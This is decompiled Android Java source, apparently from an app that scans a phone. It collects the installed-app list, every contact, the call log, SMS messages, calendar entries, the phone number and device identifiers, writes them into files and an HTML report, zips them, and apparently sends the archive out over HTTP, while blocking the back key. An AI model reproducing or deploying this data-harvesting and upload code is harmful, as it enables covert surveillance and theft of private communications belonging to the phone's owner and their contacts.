    private void setAppInfo(PackageInfo packageInfo, AppInfo appInfo) {
        appInfo.setMd5(Sign.getSingInfo(this, packageInfo.packageName, Sign.MD5));
        appInfo.setVersionCode(packageInfo.versionCode);
    }

    private String getAllApps() {
        Util.DeleteFile(Global.esnPath_ + "app_list");
        PackageManager packageManager = getPackageManager();
        if (packageManager == null) {
            return "";
        }
        List<PackageInfo> installedPackages = packageManager.getInstalledPackages(8192);
        if (installedPackages == null) {
            return "";
        }
        HashMap hashMap = new HashMap();
        StringBuffer stringBuffer = new StringBuffer("");
        int i = 0;
        for (PackageInfo packageInfo : installedPackages) {
            int i2;
            final AppInfo appInfo = new AppInfo();
            String str = packageInfo.packageName;
            try {
                PackageManager.class.getMethod("getPackageSizeInfo", new Class[]{String.class, IPackageStatsObserver.class}).invoke(getPackageManager(), new Object[]{str, new Stub() {
                    public void onGetStatsCompleted(PackageStats packageStats, boolean z) throws RemoteException {
                        if (packageStats != null) {
                            appInfo.setCodeSize(String.valueOf(packageStats.codeSize));
                        }
                    }
                }});
            } catch (NoSuchMethodException e) {
                System.out.println("NoSuchMethodException:" + e.toString());
                e.printStackTrace();
            } catch (IllegalAccessException e2) {
                System.out.println("IllegalAccessException" + e2.toString());
                e2.printStackTrace();
            } catch (IllegalArgumentException e3) {
                System.out.println("IllegalArgumentException" + e3.toString());
                e3.printStackTrace();
            } catch (InvocationTargetException e4) {
                System.out.println("InvocationTargetException" + e4.toString());
                e4.printStackTrace();
            }
            ApplicationInfo applicationInfo = packageInfo.applicationInfo;
            String charSequence = applicationInfo.loadLabel(packageManager).toString();
            if (!((appInfo.getCodeSize() != null && !appInfo.getCodeSize().equals("") && !appInfo.getCodeSize().equals("null")) || applicationInfo.publicSourceDir == null || applicationInfo.publicSourceDir.equals("") || applicationInfo.publicSourceDir.equals("null"))) {
                File file = new File(applicationInfo.publicSourceDir);
                if (file != null && file.exists()) {
                    appInfo.setCodeSize(String.valueOf(file.length()));
                }
            }
            appInfo.setAppName(charSequence);
            appInfo.setPackageName(str);
            appInfo.setVersionName(packageInfo.versionName);
            try {
                appInfo.setTime(packageInfo.firstInstallTime);
            } catch (NoSuchFieldError e5) {
            }
            appInfo.setAppPath(applicationInfo.publicSourceDir);
            if (filterApp(applicationInfo)) {
                appInfo.setIsSystemApp(true);
            } else {
                appInfo.setIsSystemApp(false);
            }
            setAppInfo(packageInfo, appInfo);
            Util.appendAppListFile(Global.esnPath_ + "app_list", appInfo.toString() + "\n");
            if (hashMap.containsKey(str)) {
                this.scandir_app_position++;
                String str2 = "";
                if (i == 0) {
                    str2 = appInfo.toString();
                } else {
                    str2 = "\n" + appInfo.toString();
                }
                stringBuffer.append(str2);
                i2 = i + 1;
            } else {
                i2 = i;
            }
            if (!stringBuffer.toString().equals("")) {
                Util.appendFile(Global.esnPath_ + "scandir_apps", stringBuffer.toString());
            }
            this.scandir_app_count++;
            i = i2;
        }
        return "";
    }

    public void showDialog(String str, String str2) {
        int i = 0;
        File file = new File(Global.absolutefilesPath_ + "/error_file");
        String str3 = "";
        if (file.exists()) {
            str3 = Util.readFileByLines(file);
            file.delete();
        }
        if (!(str3 == null || str3.equals(""))) {
            String[] split = str3.split("\t");
            if (split != null && split.length >= 2 && Util.isNumeric(split[0])) {
                i = Integer.valueOf(split[0]).intValue();
            }
        }
        int readFileCountByLines = Util.readFileCountByLines(new File(Global.esnPath_ + "scandir_temp"));
        if (readFileCountByLines > 0) {
            PlayCameraVoice();
        }
        Message message = new Message();
        message.what = 1;
        Bundle bundle = new Bundle();
        if (!str2.equals("") && str2.contains(",")) {
            bundle.putString("scandir_count", str2);
        }
        bundle.putInt("count", i);
        bundle.putInt("position", readFileCountByLines);
        bundle.putString("time", str);
        message.setData(bundle);
        this.uiHandler.sendMessage(message);
    }

    private void init() {
        Global.getGlobal().init(this);
    }

    private void readAppData(String str) {
        this.starttime = System.currentTimeMillis();
        saveHelperFile(str);
        this.endtime = System.currentTimeMillis();
        if (!"true/false".equals(str)) {
            reportHtml();
        }
        zipHelperFiles();
        this.endtime = System.currentTimeMillis();
        Logger.m16e("starttime\t\t\t  =" + this.starttime);
        Logger.m16e("endtime\t\t\t  =" + this.endtime);
        Logger.m16e("endtime - starttime =" + (this.endtime - this.starttime));
    }

    private void saveHelperFile(String str) {
        if (!"true/false".equals(str)) {
            ContactsHelper.getInstance(this).testReadAll(this.loginHandler_);
            Util.writeFile(Global.esnPath_ + "Contact.xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + ContactsHelper.getInstance(this).getHelperData());
            CallLogHelper.getInstance(this).queryAllLog(this.loginHandler_);
            Util.writeFile(Global.esnPath_ + "Dialing.xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + CallLogHelper.getInstance(this).getHelperData());
            SMSHelper.getInstance(this).queryAllSMS(this.loginHandler_);
            Util.writeFile(Global.esnPath_ + "Messages.xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + SMSHelper.getInstance(this).getHelperData());
            CalendarHepler.getInstance(this).GetCalendar(this.loginHandler_);
            Util.writeFile(Global.esnPath_ + "Calendar.xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + CalendarHepler.getInstance(this).getHelperData());
        }
        this.endtime = System.currentTimeMillis();
        sendMssage(getResources().getString(C0171R.string.checking_basic_infor));
        Util.writeFile(Global.esnPath_ + "PhoneData.cha", "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Phone>" + Global.getGlobal().getPhoneData(this.starttime, this.endtime));
        this.phoneNumber = getPhoneNumber();
        if (this.phoneNumber == null) {
            this.phoneNumber = "";
        }
        Util.writeFile(Global.esnPath_ + "phone.txt", this.phoneNumber);
        writeDeviceN();
    }

    private void writeDeviceN() {
        Util.writeFile(Global.esnPath_ + "AppParse.prop", "MODEL:" + Build.MODEL + "\n" + "CPU_ABI:" + Build.CPU_ABI + "\n" + "BOARD:" + Build.BOARD + "\n" + "HARDWARE:" + Build.HARDWARE + "\n" + "DEVICE:" + Build.DEVICE);
    }

    private void sendMssage(String str) {
        Message message = new Message();
        message.what = 101;
        Bundle bundle = new Bundle();
        bundle.putString("msgStr", str);
        message.setData(bundle);
        this.loginHandler_.sendMessage(message);
    }

    public boolean appendFile(String str, String str2) {
        try {
            return appendFile(str, str2.getBytes(HTTP.UTF_8));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean appendFile(String str, byte[] bArr) {
        if (str == null || str.length() <= 0) {
            return false;
        }
        try {
            FileOutputStream openFileOutput = openFileOutput(str, 32771);
            openFileOutput.write(bArr);
            openFileOutput.flush();
            openFileOutput.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public boolean writeFile(String str, String str2) {
        try {
            return writeFile(str, str2.getBytes(HTTP.UTF_8));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean writeFile(String str, byte[] bArr) {
        if (str == null || str.length() <= 0) {
            return false;
        }
        try {
            FileOutputStream openFileOutput = openFileOutput(str, 3);
            openFileOutput.write(bArr);
            openFileOutput.flush();
            openFileOutput.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private String getPhoneNumber() {
        return ((TelephonyManager) getSystemService("phone")).getLine1Number();
    }

    private void zipHelperFiles() {
        Util.DeleteFile(Global.zipEsnPath_);
        try {
            XZip.ZipFolder(Global.esnPath_, Global.zipEsnPath_);
        } catch (Exception e) {
            Logger.m16e(e.getMessage());
        }
    }

    private void reportHtml() {
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("<HTML>");
        stringBuffer.append(Global.getGlobal().getHtmlHead());
        stringBuffer.append("<BODY>");
        stringBuffer.append(Global.getGlobal().getPhoneInfo(this.starttime, this.endtime));
        stringBuffer.append(Global.getGlobal().getSelection());
        stringBuffer.append(SMSHelper.getInstance(this).getSMSHtml());
        stringBuffer.append(ContactsHelper.getInstance(this).getContactHtml());
        stringBuffer.append(CallLogHelper.getInstance(this).getCallHtml());
        stringBuffer.append("</BODY>");
        stringBuffer.append("</HTML>");
        Util.writeFile(Global.esnPath_ + "report.html", stringBuffer.toString());
    }

    private void unZip() {
        try {
            XZip.UnZipFolder(Global.zipEsnPath_, Global.zipEsnPath_.replaceAll(".zip", Util.getCurrentDateAndTime2()));
        } catch (Exception e) {
            Logger.m16e(e.getMessage());
        }
    }

    private void sendReq() {
        new HttpThread(this.loginHandler_, new ReqZIPEvent()).start();
    }

    private void onLoading(String str, boolean z) {
        if (z) {
            this.tv.setText(str);
            this.sendProgressLayout.setVisibility(0);
            return;
        }
        this.sendProgressLayout.setVisibility(8);
    }

    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        switch (i) {
            case 4:
                return true;
            default:
                return super.onKeyDown(i, keyEvent);
        }
    }

    private void setMessageDialog(String str, boolean z) {
        this.tv.setText(str);
    }
}
